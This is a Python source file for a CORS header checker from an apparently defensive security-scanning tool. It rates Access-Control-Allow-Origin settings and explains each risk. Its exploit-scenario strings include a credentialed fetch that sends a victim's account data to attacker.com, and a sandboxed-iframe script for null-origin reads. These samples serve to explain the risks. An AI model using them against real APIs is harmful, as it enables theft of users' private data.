"""CORS — Access-Control-Allow-Origin checker."""

from __future__ import annotations

from ..models import FindingStatus, HeaderFinding, Severity
from .base import BaseHeaderChecker

_CORS_THEFT_SCENARIO = (
    "1. Victim is logged into api.example.com (session cookie present)\n"
    "2. Attacker lures victim to evil.com which runs:\n"
    "     fetch('https://api.example.com/account/data', {credentials: 'include'})\n"
    "       .then(r => r.json())\n"
    "       .then(data => fetch('https://attacker.com/log', {method:'POST', body: JSON.stringify(data)}))\n"
    "3. Browser attaches the session cookie (credentials: include)\n"
    "4. Overly permissive CORS allows the read → attacker receives the JSON response\n"
    "5. Private data (emails, tokens, PII) exfiltrated silently"
)

_CORS_REFS = [
    "https://portswigger.net/web-security/cors",
    "https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack",
    "https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack",
    "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny",
    "https://github.com/chenjj/CORScanner",
]


class CORSChecker(BaseHeaderChecker):
    """
    Checks whether the Access-Control-Allow-Origin header is overly
    permissive. A wildcard (*) lets any website read the response,
    which is dangerous for APIs that serve authenticated or sensitive data.
    """

    header_name = "access-control-allow-origin"
    max_penalty = 15
    bonus = 0

    def check(self, headers: dict[str, str]) -> HeaderFinding:
        value = self._get(headers)

        # Header absent → not a CORS endpoint, no penalty
        if value is None:
            return HeaderFinding(
                header="Access-Control-Allow-Origin",
                status=FindingStatus.PRESENT,
                severity=Severity.INFO,
                score_impact=0,
                title="Access-Control-Allow-Origin not set (expected for non-CORS endpoints)",
                description=(
                    "This page does not expose a CORS policy, which is the correct "
                    "default for non-API pages. No action needed."
                ),
                references=[
                    "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS",
                ],
            )

        normalized = value.strip()

        if normalized == "*":
            # Check if credentials are also allowed (worst case)
            allow_credentials = self._get(headers, "access-control-allow-credentials")
            if allow_credentials and allow_credentials.strip().lower() == "true":
                return HeaderFinding(
                    header="Access-Control-Allow-Origin",
                    status=FindingStatus.INVALID,
                    severity=Severity.CRITICAL,
                    score_impact=-25,
                    title="CORS wildcard (*) combined with Allow-Credentials: true — browsers block this",
                    description=(
                        "Access-Control-Allow-Origin: * cannot be combined with "
                        "Access-Control-Allow-Credentials: true — browsers reject this "
                        "combination. Any attempt to send credentialed cross-origin requests "
                        "will fail. This configuration is both broken and insecure."
                    ),
                    current_value=value,
                    recommendation=(
                        "Specify the exact allowed origin instead of a wildcard:\n\n"
                        "  Access-Control-Allow-Origin: https://your-frontend.com\n"
                        "  Access-Control-Allow-Credentials: true\n\n"
                        "Dynamically reflect the Origin header only after validating it "
                        "against an allowlist."
                    ),
                    references=[
                        "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS/Errors/CORSNotSupportingCredentials",
                        "https://portswigger.net/web-security/cors",
                    ],
                    exploit_scenario=(
                        "This config is broken in modern browsers — but some older/misconfigured\n"
                        "clients may still process it. Additionally, if a developer 'fixes' this by\n"
                        "changing to a reflected-origin implementation without proper validation,\n"
                        "the result is the same cross-origin data theft scenario:\n\n"
                        + _CORS_THEFT_SCENARIO
                    ),
                    exploit_references=_CORS_REFS,
                )

            return HeaderFinding(
                header="Access-Control-Allow-Origin",
                status=FindingStatus.WARNING,
                severity=Severity.HIGH,
                score_impact=-self.max_penalty,
                title="CORS wildcard (*) allows any origin to read responses",
                description=(
                    "Access-Control-Allow-Origin: * means every website in the world "
                    "can make cross-site requests and read the responses from this endpoint. "
                    "For public, unauthenticated static assets this may be intentional — "
                    "but for any endpoint that returns user data, tokens, or internal "
                    "information it is a serious data-exposure vulnerability."
                ),
                current_value=value,
                recommendation=(
                    "If this is a public CDN asset, the wildcard is acceptable.\n\n"
                    "If this serves any user-specific data:\n\n"
                    "  Access-Control-Allow-Origin: https://your-allowed-origin.com\n\n"
                    "Validate the incoming Origin header against an allowlist and reflect "
                    "it dynamically. Never reflect arbitrary Origin values without validation."
                ),
                references=[
                    "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS",
                    "https://portswigger.net/web-security/cors",
                    "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny",
                ],
                exploit_scenario=(
                    "Wildcard without credentials — attacker reads unauthenticated data:\n\n"
                    "1. Attacker hosts evil.com with script:\n"
                    "     fetch('https://api.example.com/public/prices')\n"
                    "       .then(r => r.json()).then(data => exfiltrate(data))\n"
                    "2. No session needed — ACAO: * allows any origin to read the response\n"
                    "3. If the API 'accidentally' includes internal data, it leaks\n\n"
                    "CORScanner tool can enumerate all CORS misconfigurations automatically."
                ),
                exploit_references=_CORS_REFS,
            )

        if normalized.lower() == "null":
            return HeaderFinding(
                header="Access-Control-Allow-Origin",
                status=FindingStatus.WARNING,
                severity=Severity.HIGH,
                score_impact=-10,
                title="Access-Control-Allow-Origin: null is dangerous",
                description=(
                    "Allowing the 'null' origin is a well-known security mistake. "
                    "Sandboxed iframes, redirected requests, and local HTML files all "
                    "send Origin: null, so an attacker can craft a page that makes "
                    "credentialed requests from a sandboxed iframe and get the response."
                ),
                current_value=value,
                recommendation=(
                    "Never use 'null' as an allowed origin. "
                    "Specify the exact HTTPS origin:\n\n"
                    "  Access-Control-Allow-Origin: https://your-frontend.com"
                ),
                references=[
                    "https://portswigger.net/web-security/cors",
                ],
                exploit_scenario=(
                    "1. Attacker creates evil.com/attack.html with:\n"
                    "     <iframe sandbox='allow-scripts allow-forms' srcdoc='\n"
                    "       <script>\n"
                    "         fetch(\"https://api.example.com/me\", {credentials:\"include\"})\n"
                    "           .then(r=>r.text()).then(d=>parent.postMessage(d,\"*\"))\n"
                    "       </script>'\n"
                    "     ></iframe>\n"
                    "2. Sandboxed iframe sends Origin: null\n"
                    "3. Server sees 'null' and reflects it as Access-Control-Allow-Origin: null\n"
                    "4. Browser reads the credentialed response → data exfiltrated to attacker"
                ),
                exploit_references=_CORS_REFS,
            )

        # Specific origin — check for missing Vary: Origin (cache poisoning risk)
        vary = self._get(headers, "vary") or ""
        missing_vary = "origin" not in vary.lower()

        if missing_vary:
            return HeaderFinding(
                header="Access-Control-Allow-Origin",
                status=FindingStatus.WARNING,
                severity=Severity.MEDIUM,
                score_impact=-5,
                title=f"CORS restricted to '{normalized}' but Vary: Origin is missing (cache poisoning risk)",
                description=(
                    f"Access-Control-Allow-Origin is set to a specific origin ({normalized}). "
                    "However, the response is missing 'Vary: Origin'. When a proxy or CDN caches "
                    "this response, it may serve it to requests from OTHER origins — with the "
                    "original allowed-origin value still set. This is a cache-poisoning vector: "
                    "another origin can receive a response that says they are allowed, "
                    "and the browser honours it."
                ),
                current_value=value,
                recommendation=(
                    "Add Vary: Origin whenever Access-Control-Allow-Origin is set dynamically:\n\n"
                    "  Vary: Origin\n\n"
                    "This tells caches to store separate copies per origin, preventing poisoning."
                ),
                references=[
                    "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS",
                    "https://portswigger.net/web-security/web-cache-poisoning",
                    "https://fetch.spec.whatwg.org/#cors-protocol-and-http-caches",
                ],
                exploit_scenario=(
                    "1. Legitimate request from allowed-origin.com hits CDN\n"
                    "2. CDN caches response with: Access-Control-Allow-Origin: https://allowed-origin.com\n"
                    "3. Attacker sends request from evil.com — CDN serves cached response\n"
                    "4. Response now shows ACAO: https://allowed-origin.com for evil.com's request\n"
                    "5. Some browser/proxy implementations honour this cached CORS header\n"
                    "6. Without Vary: Origin, CDN has no reason to keep per-origin cached copies\n\n"
                    "Severity increases when CDN has aggressive caching (e.g. Cloudflare Page Rules,\n"
                    "AWS CloudFront with caching headers enabled)."
                ),
                exploit_references=[
                    "https://portswigger.net/web-security/web-cache-poisoning",
                    "https://portswigger.net/research/practical-web-cache-poisoning",
                    "https://fetch.spec.whatwg.org/#cors-protocol-and-http-caches",
                ],
            )

        return HeaderFinding(
            header="Access-Control-Allow-Origin",
            status=FindingStatus.PRESENT,
            severity=Severity.HIGH,
            score_impact=0,
            title=f"CORS restricted to: {normalized}",
            description=(
                f"Access-Control-Allow-Origin is set to a specific origin ({normalized}) "
                "and Vary: Origin is present — correct CORS configuration."
            ),
            current_value=value,
            references=[
                "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS",
            ],
        )
